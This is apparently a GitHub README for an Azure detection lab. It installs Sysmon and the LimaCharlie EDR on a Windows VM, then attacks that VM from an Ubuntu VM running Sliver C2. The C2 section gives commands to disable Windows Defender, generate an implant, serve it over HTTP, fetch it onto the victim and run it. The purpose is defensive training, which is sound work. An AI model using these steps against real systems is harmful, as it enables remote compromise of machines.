# Azure-Threat-Detection-LimaCharlie-YARA
A demonstration of advanced threat detection and response using LimaCharlie SIEM, YARA rules, and Sliver C2 framework, deployed in a Microsoft Azure environment.


## Project Overview
This project focuses on deploying a comprehensive threat detection lab in Azure using Ubuntu and Windows 10 VMs to simulate real-world attacks with Sliver C2. By integrating LimaCharlie EDR with custom YARA rules, the system efficiently detects and responds to malicious files and processes. Additionally, automated detection and alerting workflows are established for advanced threat scenarios, ensuring real-time notifications via Slack for enhanced security response.

## Technologies Used

### Tools and Technologies:
- **Microsoft Azure:** Cloud platform for deploying and managing virtual machines (Ubuntu, Windows 10).
- **LimaCharlie EDR:** Endpoint Detection and Response platform for detecting and responding to threats in real-time.
- **YARA:** Pattern-matching tool for identifying and classifying malware based on custom rules.
- **Sliver C2:** Command and control framework for simulating real-world cyber attacks.
- **Sysmon (System Monitor):** Windows system service that logs system activity for enhanced threat detection.
- **Procdump:** Sysinternals tool for creating process dumps, used in malware analysis and detection.
- **Slack API:** For real-time notifications and alerts on security events.


## Setup Instructions

### Prerequisites
- **Azure Account:** Required for creating and managing the virtual machines.
- **LimaCharlie Account:** Necessary for integrating the EDR and monitoring system.
- **SSH Client:** For accessing the Ubuntu VM (e.g., built-in on Mac/Linux/Windows or third-party tools like PuTTY).
- **Admin Access:** Ensure you have administrative rights on both the VMs and your local machine for installations.

### VM Configuration
1. **Create VMs in Azure:**
   - Create two virtual machines: one Ubuntu and one Windows 10.
   - Ensure both VMs are in the same virtual network for seamless communication.
2. **Configure Windows VM:**
   - Disable Windows Defender to prevent interference during simulations.
   - Set up static IPs for both VMs for easier management.

### Installation

1. **Install Sysmon on Windows VM:**
   - **Open an Administrative PowerShell Console:**
     - Click the "Start" menu, search for "PowerShell," right-click on "Windows PowerShell," and select "Run as administrator."
   - **Download and Unzip Sysmon:**
     ```powershell
     Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
     Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
     ```
   - **Download SwiftOnSecurity’s Sysmon Config:**
     ```powershell
     Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml
     ```
   - **Install Sysmon with the Config:**
     ```powershell
     C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml
     ```
   - **Validate Sysmon Installation:**
     ```powershell
     Get-Service sysmon64
     ```

2. **Install LimaCharlie EDR on Windows VM:**
   - **Add Sensor in LimaCharlie:**
     - Once the organization is created in LimaCharlie, click "Add Sensor" and select "Windows."
     - Provide a description (e.g., "Windows VM - Lab") and click "Create."
   - **Install Sensor via PowerShell:**
     ```powershell
     cd C:\Users\User\Downloads
     Invoke-WebRequest -Uri https://downloads.limacharlie.io/sensor/windows/64 -Outfile C:\Users\User\Downloads\lc_sensor.exe
     ```
     - **Copy the installation command** provided by LimaCharlie (which contains the installation key) and run it in the terminal. Verify that the sensor is reporting in the LimaCharlie web UI.

3. **Configure LimaCharlie to Ship Sysmon Logs:**
   - **Add Artifact Collection Rule in LimaCharlie:**
     - In the left-side menu, click "Artifact Collection" and then "Add Rule."
     - **Rule Settings:**
       - Name: `windows-sysmon-logs`
       - Platforms: `Windows`
       - Path Pattern: `wel://Microsoft-Windows-Sysmon/Operational:*`
       - Retention Period: `10`
     - Click "Save Rule."

### Deployment

1. **Setup Attack System (Linux VM):**
   - **SSH into the Ubuntu VM:**
     ```bash
     ssh user@[Linux_VM_IP]
     ```
   - **Download and Install Sliver C2 Server:**
     ```bash
     sudo su
     wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server
     chmod +x /usr/local/bin/sliver-server
     apt install -y mingw-w64
     ```
   - **Create Working Directory:**
     ```bash
     mkdir -p /opt/sliver
     ```

2. **Generate and Deploy C2 Payload:**
   - **Generate Payload:**
     ```bash
     generate --http [Linux_VM_IP] --save /opt/sliver
     ```
   - **Serve Payload via Python HTTP Server:**
     ```bash
     cd /opt/sliver
     python3 -m http.server 80
     ```
   - **Download Payload on Windows VM:**
     - Open an Administrative PowerShell console on Windows VM and run:
       ```powershell
       IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
       ```

3. **Start Command and Control Session:**
   - **In Linux VM:**
     - Stop the Python web server (`Ctrl + C`).
     - Start the Sliver server:
       ```bash
       sliver-server
       ```
     - Start the HTTP listener within the Sliver shell:
       ```bash
       http
       ```
   - **In Windows VM:**
     - Execute the C2 payload:
       ```powershell
       C:\Users\User\Downloads\<your_C2-implant>.exe
       ```

4. **Observe EDR Telemetry:**
   - In the LimaCharlie web UI, navigate to "Sensors" and select the active Windows sensor.
   - Check the "Timeline" for real-time EDR telemetry and event logs. If you scroll back far enough, you should be able to find the moment your implant was created on the system, when it was launched shortly after, and the network connections it created immediately after.
